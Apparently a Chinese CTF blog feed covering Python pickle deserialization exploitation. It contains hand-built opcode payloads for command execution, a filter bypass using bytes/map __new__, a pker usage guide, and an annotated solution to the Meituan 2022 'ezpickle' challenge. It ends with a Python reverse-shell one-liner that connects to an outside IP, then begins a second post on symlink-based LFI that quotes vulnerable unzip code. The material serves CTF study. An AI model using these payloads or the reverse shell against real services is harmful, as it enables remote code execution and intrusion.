class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用<code>o</code>操作码</p><pre class="line-numbers language-none"><code class="language-none">c&#x3D;b&#39;\x80\x03(cbuiltins\ngetattr\np0\ncbuiltins\ndict\np1\nX\x03\x00\x00\x00getop2\n0(g2\n(cbuiltins\nglobals\noX\x0C\x00\x00\x00__builtins__op3\n(g0\ng3\nX\x04\x00\x00\x00evalop4\n(g4\nX\x21\x00\x00\x00__import__(&quot;os&quot;).system(&quot;whoami&quot;)o00.&#39;#最后两个0是栈为空，否则会报错<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="绕过域名空间限制"><a href="#绕过域名空间限制" class="headerlink" title="绕过域名空间限制"></a>绕过域名空间限制</h3><p>重写sys.modules</p><p>之前说过find_class使用<code>sys.modules[module],name)</code>来引入模块，但是sys自身也在sys.modules中，所以通过s操作符使sys.modules[‘sys’]&#x3D;sys.modules，sys模块也就变成了sys.modules模块，然后引入sys.modules中的get方法，取得sys.modules字典中的os模块，再使用s操作符使sys.modules[‘sys’]&#x3D;os，当前sys模块就变成了os模块，最后成功执行os.system(“whoami”)。</p><pre class="line-numbers language-none"><code class="language-none">R操作码payload&#x3D;b&#39;csys\nmodules\np0\nX\x03\x00\x00\x00sysg0\nscsys\nget\np1\ng1\nX\x02\x00\x00\x00os\x85Rp2\ng0\nX\x03\x00\x00\x00sysg2\nscsys\nsystem\nX\x06\x00\x00\x00whoami\x85R.&#39;o操作码payload&#x3D;b&#39;csys\nmodules\np0\nX\x03\x00\x00\x00sysg0\ns(csys\nget\np1\nX\x02\x00\x00\x00osop2\ng0\nX\x03\x00\x00\x00sysg2\ns(csys\nsystem\nX\x06\x00\x00\x00whoamio.&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="自动化编写-pickle-opcode"><a href="#自动化编写-pickle-opcode" class="headerlink" title="自动化编写 pickle opcode"></a>自动化编写 pickle opcode</h2><p>使用工具pker</p><p>pker的作用：</p><blockquote><ul><li>变量赋值：存到memo中，保存memo下标和变量名即可</li><li>函数调用</li><li>类型字面量构造</li><li>list和dict成员修改</li><li>对象成员变量修改</li></ul></blockquote><p>具体来讲，可以使用pker进行<strong>原变量覆盖、函数执行、实例化新的对象</strong>。</p><h2 id="pickle-opcode使用方法与示例"><a href="#pickle-opcode使用方法与示例" class="headerlink" title="pickle opcode使用方法与示例"></a>pickle opcode使用方法与示例</h2><ol><li>pker中的针对pickle的特殊语法需要重点掌握（后文给出示例）</li><li>此外我们需要注意一点：python中的所有类、模块、包、属性等都是对象，这样便于对各操作进行理解。</li><li>pker主要用到<code>GLOBAL、INST、OBJ</code>三种特殊的函数以及一些必要的转换方式，其他的opcode也可以手动使用：</li></ol><pre class="line-numbers language-none"><code class="language-none">以下module都可以是包含&#96;.&#96;的子module调用函数时，注意传入的参数类型要和示例一致对应的opcode会被生成，但并不与pker代码相互等价GLOBAL对应opcode：b&#39;c&#39;获取module下的一个全局对象（没有import的也可以，比如下面的os）：GLOBAL(&#39;os&#39;, &#39;system&#39;)输入：module,instance(callable、module都是instance)  INST对应opcode：b&#39;i&#39;建立并入栈一个对象（可以执行一个函数）：INST(&#39;os&#39;, &#39;system&#39;, &#39;ls&#39;)  输入：module,callable,para OBJ对应opcode：b&#39;o&#39;建立并入栈一个对象（传入的第一个参数为callable，可以执行一个函数））：OBJ(GLOBAL(&#39;os&#39;, &#39;system&#39;), &#39;ls&#39;) 输入：callable,paraxxx(xx,...)对应opcode：b&#39;R&#39;使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）li[0]&#x3D;321或globals_dic[&#39;local_var&#39;]&#x3D;&#39;hello&#39;对应opcode：b&#39;s&#39;更新列表或字典的某项的值xx.attr&#x3D;123对应opcode：b&#39;b&#39;对xx对象进行属性设置return对应opcode：b&#39;0&#39;出栈（作为pickle.loads函数的返回值）：return xxx # 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：</p><ol><li>由于opcode本身的功能问题，pker肯定也不支持列表索引、字典索引、点号取对象属性作为<strong>左值</strong>，需要索引时只能先获取相应的函数（如<code>getattr</code>、<code>dict.get</code>）才能进行。但是因为存在<code>s</code>、<code>u</code>、<code>b</code>操作符，<strong>作为右值是可以的</strong>。即“查值不行，赋值可以”。</li><li>pker解析<code>S</code>时，用单引号包裹字符串。所以pker代码中的双引号会被解析为单引号opcode:</li></ol><pre class="line-numbers language-none"><code class="language-none">test&#x3D;&quot;123&quot;return test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>被解析为：</p><pre class="line-numbers language-none"><code class="language-none">b&quot;S&#39;123&#39;\np0\n0g0\n.&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="pker：全局变量覆盖"><a href="#pker：全局变量覆盖" class="headerlink" title="pker：全局变量覆盖"></a>pker：全局变量覆盖</h3><ul><li>覆盖直接由执行文件引入的<code>secret</code>模块中的<code>name</code>与<code>category</code>变量：</li></ul><pre class="line-numbers language-none"><code class="language-none">secret&#x3D;GLOBAL(&#39;__main__&#39;, &#39;secret&#39;) # python的执行文件被解析为__main__对象，secret在该对象从属下secret.name&#x3D;&#39;1&#39;secret.category&#x3D;&#39;2&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>覆盖引入模块的变量：</li></ul><pre class="line-numbers language-none"><code class="language-none">game &#x3D; GLOBAL(&#39;guess_game&#39;, &#39;game&#39;)game.curr_ticket &#x3D; &#39;123&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>接下来会给出一些具体的基本操作的实例。</p><h4 id="pker：函数执行"><a href="#pker：函数执行" class="headerlink" title="pker：函数执行"></a>pker：函数执行</h4><ul><li>通过<code>b&#39;R&#39;</code>调用：</li></ul><pre class="line-numbers language-none"><code class="language-none">s&#x3D;&#39;whoami&#39;system &#x3D; GLOBAL(&#39;os&#39;, &#39;system&#39;)system(s) # &#96;b&#39;R&#39;&#96;调用return<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>通过<code>b&#39;i&#39;</code>调用：</li></ul><pre class="line-numbers language-none"><code class="language-none">INST(&#39;os&#39;, &#39;system&#39;, &#39;whoami&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>通过<code>b&#39;c&#39;</code>与<code>b&#39;o&#39;</code>调用：</li></ul><pre class="line-numbers language-none"><code class="language-none">OBJ(GLOBAL(&#39;os&#39;, &#39;system&#39;), &#39;whoami&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>多参数调用函数</li></ul><pre class="line-numbers language-none"><code class="language-none">INST(&#39;[module]&#39;, &#39;[callable]&#39;[, par0,par1...])OBJ(GLOBAL(&#39;[module]&#39;, &#39;[callable]&#39;)[, par0,par1...])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="pker：实例化对象"><a href="#pker：实例化对象" class="headerlink" title="pker：实例化对象"></a>pker：实例化对象</h4><ul><li>实例化对象是一种特殊的函数执行</li></ul><pre class="line-numbers language-none"><code class="language-none">animal &#x3D; INST(&#39;__main__&#39;, &#39;Animal&#39;,&#39;1&#39;,&#39;2&#39;)return animal# 或者animal &#x3D; OBJ(GLOBAL(&#39;__main__&#39;, &#39;Animal&#39;), &#39;1&#39;,&#39;2&#39;)return animal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>其中，python原文件中包含：</li></ul><pre class="line-numbers language-none"><code class="language-none">class Animal:    def __init__(self, name, category):        self.name &#x3D; name        self.category &#x3D; category<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>也可以先实例化再赋值：</li></ul><pre class="line-numbers language-none"><code class="language-none">animal &#x3D; INST(&#39;__main__&#39;, &#39;Animal&#39;)animal.name&#x3D;&#39;1&#39;animal.category&#x3D;&#39;2&#39;return animal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="手动辅助"><a href="#手动辅助" class="headerlink" title="手动辅助"></a>手动辅助</h4><ul><li>拼接opcode：将第一个pickle流结尾表示结束的<code>.</code>去掉，两者拼接起来即可。</li><li>建立普通的类时，可以先pickle.dumps，再拼接至payload。</li></ul><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>美团2022 ezpickle</p><pre class="line-numbers language-none"><code class="language-none">@app.route(&#39;&#x2F;admin&#39;)def admin():    if session.get(&#39;user&#39;) !&#x3D; &quot;admin&quot;:        return f&quot;&lt;script&gt;alert(&#39;Access Denied&#39;);window.location.href&#x3D;&#39;&#x2F;&#39;&lt;&#x2F;script&gt;&quot;    else:        try:            a &#x3D; base64.b64decode(session.get(&#39;ser_data&#39;)).replace(b&quot;builtin&quot;, b&quot;BuIltIn&quot;).replace(b&quot;os&quot;, b&quot;Os&quot;).replace(b&quot;bytes&quot;, b&quot;Bytes&quot;)            if b&#39;R&#39; in a or b&#39;i&#39; in a or b&#39;o&#39; in a or b&#39;b&#39; in a:                raise pickle.UnpicklingError(&quot;R i o b is forbidden&quot;)            pickle.loads(base64.b64decode(session.get(&#39;ser_data&#39;)))            return &quot;ok&quot;        except:            return &quot;error!&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>题目过滤了 Riob 这四个字母</p><p>考虑使用</p><pre class="line-numbers language-none"><code class="language-none">import osbytes.__new__(bytes,map.__new__(map,eval,[&#39;print(11111)&#39;]))#11111bytes.__new__(bytes,map.__new__(map,os.system,[&#39;whoami&#39;]))bytes.__new__(bytes,map.__new__(map,os.system,(&#39;whoami&#39;,)) #map的第二个参数只要是可迭代对象就可以了#laptop-j0acdp41\jackbin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="原理：python内置函数"><a href="#原理：python内置函数" class="headerlink" title="原理：python内置函数"></a>原理：python内置函数</h3><p><code>map</code>(<em>function</em>, <em>iterable</em>, <em>…</em>)</p><p>返回一个<strong>将 *function* 应用于 *iterable* 中每一项并输出其结果的迭代器</strong>。 如果传入了额外的 <em>iterable</em> 参数，<em>function</em> 必须接受相同个数的实参并被应用于从所有可迭代对象中并行获取的项。 当有多个可迭代对象时，最短的可迭代对象耗尽则整个迭代就将结束。</p><p><em>class</em> <code>bytes</code>([<em>source</em>[, <em>encoding</em>[, <em>errors</em>]]])</p><p>返回一个新的“bytes”对象， 是一个不可变序列，包含范围为 <code>0 &lt;= x &lt; 256</code> 的整数。<a href="stdtypes.html#bytes"><code>bytes</code></a> 是 <a href="stdtypes.html#bytearray"><code>bytearray</code></a> 的不可变版本 - 它有其中不改变序列的方法和相同的索引、切片操作。</p><pre class="line-numbers language-none"><code class="language-none">cls.__new__(cls,arg*)&#96;等价于 &#96;cls(arg*)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>构造的payload</p><pre class="line-numbers language-none"><code class="language-none">#bytes.__new__(bytes,map.__new__(map,os.system,[&#39;whoami&#39;]))#或者#bytes.__new__(bytes,map.__new__(map,os.system,(&#39;whoami&#39;,)))#或者#bytes.__new__(bytes,map.__new__(map,os.system,&#123;&#39;whoami&#39;,&#125;))#laptop-j0acdp41\jackbinpayload&#x3D;b&#39;&#39;&#39;c__builtin__mapp00(S&#39;whoami&#39;tp10(cossystemg1tp20g0g2\x81p30c__builtin__bytesp4(g3t\x81.&#39;&#39;&#39;payload&#x3D;b&#39;&#39;&#39;cbuiltinsmapp00(S&#39;whoami&#39;tp10(cossystemg1tp20g0g2\x81p30cbuiltinsbytesp4(g3t\x81.&#39;&#39;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析:</p><h3 id="第1步c"><a href="#第1步c" class="headerlink" title="第1步c:"></a>第1步<code>c</code>:</h3><pre class="line-numbers language-none"><code class="language-none">def load_global(self):    module &#x3D; self.readline()[:-1].decode(&quot;utf-8&quot;) #__builtin__ 或者 builtins    name &#x3D; self.readline()[:-1].decode(&quot;utf-8&quot;) #map    klass &#x3D; self.find_class(module, name) #获取builtins模块下的map类 &lt;class &#39;map&#39;&gt;    self.append(klass)  #将&lt;class &#39;map&#39;&gt;压入自身栈中dispatch[GLOBAL[0]] &#x3D; load_global<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>自身栈：</p><pre class="line-numbers language-none"><code class="language-none">stack:[&lt;class &#39;map&#39;&gt;]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="第2步p0"><a href="#第2步p0" class="headerlink" title="第2步p0"></a>第2步<code>p0</code></h3><p>将&#96;&#96;放入记忆栈0位置中</p><p>记忆栈：</p><pre class="line-numbers language-none"><code class="language-none">memo:[&lt;class &#39;map&#39;&gt;]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="第3步0"><a href="#第3步0" class="headerlink" title="第3步0"></a>第3步<code>0</code></h3><p>去掉自身栈中的栈顶元素</p><p>自身栈：</p><pre class="line-numbers language-none"><code class="language-none">空<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="第4步"><a href="#第4步" class="headerlink" title="第4步("></a>第4步<code>(</code></h3><p>向栈(self.stack)中插入一个merk标记</p><pre class="line-numbers language-none"><code class="language-none">def load_mark(self):    self.metastack.append(self.stack) #将当前的栈整个记录到 metastack #空栈    self.stack &#x3D; [] #然后将栈置空    self.append &#x3D; self.stack.appenddispatch[MARK[0]] &#x3D; load_mark<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="第5步S-39-whoami-39"><a href="#第5步S-39-whoami-39" class="headerlink" title="第5步S&#39;whoami&#39;"></a>第5步<code>S&#39;whoami&#39;</code></h3><p>读取字符串将字符串压入栈中</p><p>自身栈：</p><pre class="line-numbers language-none"><code class="language-none">stack:[&#39;whoami&#39;]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="第6步t"><a href="#第6步t" class="headerlink" title="第6步t"></a>第6步<code>t</code></h3><p>  寻找栈中的上一个MARK，<strong>并组合之间的数据为元组</strong>，恢复MARK标志之前的栈，并且加到MARK之前的栈</p><pre class="line-numbers language-none"><code class="language-none">def load_tuple(self):    items &#x3D; self.pop_mark() #当前自身栈    self.append(tuple(items)) #用当前栈中的内容生成tuple，并且加到MARK之前的栈dispatch[TUPLE[0]] &#x3D; load_tuple<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>pop_mark()</p><pre class="line-numbers language-none"><code class="language-none"># Return a list of items pushed in the stack after last MARK instruction.# 把自身栈 变回 上一次MARK之前的栈def pop_mark(self):    items &#x3D; self.stack    self.stack &#x3D; self.metastack.pop() # 把自身栈 变回 上一次MARK之前的栈    self.append &#x3D; self.stack.append    return items #返回调用时的自身栈<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>自身栈：</p><pre class="line-numbers language-none"><code class="language-none">stack:[(&#39;whoami&#39;,)]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="第7步p1"><a href="#第7步p1" class="headerlink" title="第7步p1"></a>第7步<code>p1</code></h3><p>将<code>(&#39;whoami&#39;,)</code>放入记忆栈1位置中</p><p>记忆栈：</p><pre class="line-numbers language-none"><code class="language-none">memo:[&lt;class &#39;map&#39;&gt;,(&#39;whoami&#39;,)]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="第8步0"><a href="#第8步0" class="headerlink" title="第8步0"></a>第8步<code>0</code></h3><p>去掉自身栈中的栈顶元素</p><p>自身栈：</p><pre class="line-numbers language-none"><code class="language-none">stack:[]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="第9步"><a href="#第9步" class="headerlink" title="第9步("></a>第9步<code>(</code></h3><p>向栈(self.stack)中插入一个merk标记</p><p>记录栈：</p><pre class="line-numbers language-none"><code class="language-none">stack:[]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="第10步c"><a href="#第10步c" class="headerlink" title="第10步c:"></a>第10步<code>c</code>:</h3><pre class="line-numbers language-none"><code class="language-none">def load_global(self):    module &#x3D; self.readline()[:-1].decode(&quot;utf-8&quot;) #os    name &#x3D; self.readline()[:-1].decode(&quot;utf-8&quot;) #system    klass &#x3D; self.find_class(module, name) #获取os模块下的system类 &lt;built-in function system&gt;    self.append(klass)  #将&lt;built-in function system&gt;压入自身栈中dispatch[GLOBAL[0]] &#x3D; load_global<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>自身栈：</p><pre class="line-numbers language-none"><code class="language-none">stack:[&lt;built-in function system&gt;]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="第11步g1"><a href="#第11步g1" class="headerlink" title="第11步g1"></a>第11步<code>g1</code></h3><p>将memo中的下标为1个数据，放入栈中</p><p>自身栈：</p><pre class="line-numbers language-none"><code class="language-none">stack:[&lt;built-in function system&gt;,(&#39;whoami&#39;,)]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="第12步t"><a href="#第12步t" class="headerlink" title="第12步t"></a>第12步<code>t</code></h3><p>  寻找栈中的上一个MARK，<strong>并组合之间的数据为元组</strong>，恢复MARK标志之前的栈，并且加到MARK之前的栈</p><pre class="line-numbers language-none"><code class="language-none">def load_tuple(self):    items &#x3D; self.pop_mark() #恢复当前自身栈为MARK标志之前的栈    self.append(tuple(items)) #用当前栈中的内容生成tuple，并且加到MARK之前的栈dispatch[TUPLE[0]] &#x3D; load_tuple<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>自身栈：</p><pre class="line-numbers language-none"><code class="language-none">stack:[(&lt;built-in function system&gt;,(&#39;whoami&#39;,),)]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="第13步p2"><a href="#第13步p2" class="headerlink" title="第13步p2"></a>第13步<code>p2</code></h3><p>将<code>(,,)</code>放入记忆栈2位置中</p><p>记忆栈：</p><pre class="line-numbers language-none"><code class="language-none">memo:[&lt;class &#39;map&#39;&gt;,(&#39;whoami&#39;,),(&lt;built-in function system&gt;,(&#39;whoami&#39;,),)]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="第14步0"><a href="#第14步0" class="headerlink" title="第14步0"></a>第14步<code>0</code></h3><p>去掉自身栈中的栈顶元素</p><p>自身栈：</p><pre class="line-numbers language-none"><code class="language-none">stack:[]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="第15步-g0-g2"><a href="#第15步-g0-g2" class="headerlink" title="第15步 g0,g2"></a>第15步 <code>g0</code>,<code>g2</code></h3><p>将memo中的下标为0,2个数据，放入栈中</p><p>自身栈：</p><pre class="line-numbers language-none"><code class="language-none">stack:[&lt;class &#39;map&#39;&gt;,(&lt;built-in function system&gt;,(&#39;whoami&#39;,),)]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="第16步-x81"><a href="#第16步-x81" class="headerlink" title="第16步 \x81"></a>第16步 <code>\x81</code></h3><pre class="line-numbers language-none"><code class="language-none">def load_newobj(self):    args &#x3D; self.stack.pop() #(&lt;built-in function system&gt;,(&#39;whoami&#39;,),)    cls &#x3D; self.stack.pop() #&lt;class &#39;map&#39;&gt;    obj &#x3D; cls.__new__(cls, *args) #map.__new__(map,(&lt;built-in function system&gt;,(&#39;whoami&#39;,),)) 将&lt;built-in function system&gt;和(&#39;whoami&#39;,)作为参数，生成了map对象 &lt;map object at 0x000001AF74D25790&gt;    self.append(obj)dispatch[NEWOBJ[0]] &#x3D; load_newobj<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>自身栈：</p><pre class="line-numbers language-none"><code class="language-none">stack:[&lt;map object at 0x000001AF74D25790&gt;]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="第17步p3"><a href="#第17步p3" class="headerlink" title="第17步p3"></a>第17步<code>p3</code></h3><p>将&#96;&#96;放入记忆栈2位置中</p><p>记忆栈：</p><pre class="line-numbers language-none"><code class="language-none">memo:[&lt;class &#39;map&#39;&gt;,(&#39;whoami&#39;,),(&lt;built-in function system&gt;,(&#39;whoami&#39;,),),&lt;map object at 0x000001AF74D25790&gt;]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="第18步0"><a href="#第18步0" class="headerlink" title="第18步0"></a>第18步<code>0</code></h3><p>去掉自身栈中的栈顶元素</p><p>自身栈：</p><pre class="line-numbers language-none"><code class="language-none">stack:[]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="第19步c"><a href="#第19步c" class="headerlink" title="第19步c:"></a>第19步<code>c</code>:</h3><pre class="line-numbers language-none"><code class="language-none">def load_global(self):    module &#x3D; self.readline()[:-1].decode(&quot;utf-8&quot;) #__builtin__ 或者 builtins    name &#x3D; self.readline()[:-1].decode(&quot;utf-8&quot;) #bytes    klass &#x3D; self.find_class(module, name) #获取builtins模块下的bytes类 &lt;class &#39;bytes&#39;&gt;    self.append(klass)  #将&lt;class &#39;bytes&#39;&gt;压入自身栈中dispatch[GLOBAL[0]] &#x3D; load_global<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>自身栈：</p><pre class="line-numbers language-none"><code class="language-none">stack:[&lt;class &#39;bytes&#39;&gt;]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="第20步p4"><a href="#第20步p4" class="headerlink" title="第20步p4"></a>第20步<code>p4</code></h3><p>将&#96;&#96;放入记忆栈2位置中</p><p>记忆栈：</p><pre class="line-numbers language-none"><code class="language-none">memo:[&lt;class &#39;map&#39;&gt;,(&#39;whoami&#39;,),(&lt;built-in function system&gt;,(&#39;whoami&#39;,),),&lt;map object at 0x000001AF74D25790&gt;,&lt;class &#39;bytes&#39;&gt;]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="第21步"><a href="#第21步" class="headerlink" title="第21步("></a>第21步<code>(</code></h3><p>向栈(self.stack)中插入一个merk标记，并将当前栈暂时置空，遇到pop_mark函数，就会恢复</p><p>记录栈：</p><pre class="line-numbers language-none"><code class="language-none">stack:[&lt;class &#39;bytes&#39;&gt;]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>自身栈：</p><pre class="line-numbers language-none"><code class="language-none">stack:[]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="第22步g3"><a href="#第22步g3" class="headerlink" title="第22步g3"></a>第22步<code>g3</code></h3><p>将memo中的下标为3个数据，放入栈中</p><p>自身栈：</p><pre class="line-numbers language-none"><code class="language-none">stack:[&lt;map object at 0x000001AF74D25790&gt;]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="第23步t"><a href="#第23步t" class="headerlink" title="第23步t"></a>第23步<code>t</code></h3><p>  寻找栈中的上一个MARK，<strong>并组合之间的数据为元组</strong>，恢复MARK标志之前的栈，并且加到MARK之前的栈</p><pre class="line-numbers language-none"><code class="language-none">def load_tuple(self):    items &#x3D; self.pop_mark() #恢复当前自身栈为MARK标志之前的栈    self.append(tuple(items)) #用当前栈中的内容生成tuple，并且加到MARK之前的栈dispatch[TUPLE[0]] &#x3D; load_tuple<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>自身栈：</p><pre class="line-numbers language-none"><code class="language-none">stack:[&lt;class &#39;bytes&#39;&gt;,(&lt;map object at 0x000001AF74D25790&gt;,)]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="第24步-x81-实现命令执行函数调用"><a href="#第24步-x81-实现命令执行函数调用" class="headerlink" title="第24步 \x81 实现命令执行函数调用"></a>第24步 <code>\x81</code> 实现命令执行函数调用</h3><p><strong><strong>传入的arg必须是一个tuple</strong></strong></p><pre class="line-numbers language-none"><code class="language-none">def load_newobj(self):    args &#x3D; self.stack.pop() #(&lt;map object at 0x000001AF74D25790&gt;,)    cls &#x3D; self.stack.pop() #&lt;class &#39;bytes&#39;&gt;    obj &#x3D; cls.__new__(cls, *args) #bytes.__new__(bytes,(&lt;map object at 0x000001AF74D25790&gt;,)) 将(&lt;map object at 0x000001AF74D25790&gt;,)作为参数，生成了bytes对象 &lt;bytes object at 0x000001AF74D56790&gt;    #相当于 bytes.__new__(bytes,map.__new__(map,os.system,(&#39;whoami&#39;,)))    ##实现命令执行    self.append(obj)dispatch[NEWOBJ[0]] &#x3D; load_newobj<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="第25步-结束"><a href="#第25步-结束" class="headerlink" title="第25步.结束"></a>第25步<code>.</code>结束</h3><p>一般pickle使用的反弹shell方法都是使用python</p><pre class="line-numbers language-none"><code class="language-none">import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.244.133&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CTFWEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux软连接</title>
      <link href="/2022/09/18/linux-ruan-lian-jie/"/>
      <url>/2022/09/18/linux-ruan-lian-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="Linux软连接实现LFI"><a href="#Linux软连接实现LFI" class="headerlink" title="Linux软连接实现LFI"></a>Linux软连接实现LFI</h2><p>例子：</p><p>柏鹭杯 简单的解压unzip</p><p>美团杯 OnlineUnzip</p><h2 id="特征："><a href="#特征：" class="headerlink" title="特征："></a>特征：</h2><p> 你一个黑盒测试环境：可以上传任意文件，<strong>文件将在上传完成后被读取并将内容返回至网页</strong>.(除了利用文件上传漏洞，进行getshell，还可以利用Linux软连接实现LFI)</p><p>一般是<strong>以在线压缩包解压网站的形式</strong></p><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>参考： <a href="https://xz.aliyun.com/t/2589?page=1">https://xz.aliyun.com/t/2589?page=1</a> </p><p>以美团杯 OnlineUnzip 为例子</p><p>app.py</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">import osimport refrom hashlib import md5from flask import Flask, redirect, request, render_template, url_for, make_responseapp&#x3D;Flask(__name__)def extractFile(filepath):    extractdir&#x3D;filepath.split(&#39;.&#39;)[0]    if not os.path.exists(extractdir):        os.makedirs(extractdir)    os.system(f&#39;unzip -o &#123;filepath&#125; -d &#123;extractdir&#125;&#39;)    return redirect(url_for(&#39;display&#39;,extractdir&#x3D;extractdir))@app.route(&#39;&#x2F;&#39;, methods&#x3D;[&#39;GET&#39;])def index():    return render_template(&#39;index.html&#39;)@app.route(&#39;&#x2F;display&#39;, methods&#x3D;[&#39;GET&#39;])@app.route(&#39;&#x2F;display&#x2F;&#39;, methods&#x3D;[&#39;GET&#39;])@app.route(&#39;&#x2F;display&#x2F;&lt;path:extractdir&gt;&#39;, methods&#x3D;[&#39;GET&#39;])def display(extractdir&#x3D;&#39;&#39;):    if re.search(r&quot;\.\.&quot;, extractdir, re.M | re.I) !&#x3D; None:        return &quot;Hacker?&quot;    else:        if not os.path.exists(extractdir):            return make_response(&quot;error&quot;, 404)        else:            if not os.path.isdir(extractdir):                f &#x3D; open(extractdir, &#39;rb&#39;)                response &#x3D; make_response(f.read())                response.headers[&#39;Content-Type&#39;] &#x3D; &#39;application&#x2F;octet-stream&#39;                return response            else:                fn &#x3D; os.listdir(extractdir)                fn &#x3D; [&quot;..&quot;] + fn                f &#x3D; open(&quot;templates&#x2F;template.html&quot;)                x &#x3D; f.read()                f.close()                ret &#x3D; &quot;&lt;h1&gt;文件列表:&lt;&#x2F;h1&gt;&lt;br&gt;&lt;hr&gt;&quot;                for i in fn:                    tpath &#x3D; os.path.join(&#39;&#x2F;display&#39;, extractdir, i)                    ret +&#x3D; &quot;&lt;a href&#x3D;&#39;&quot; + tpath + 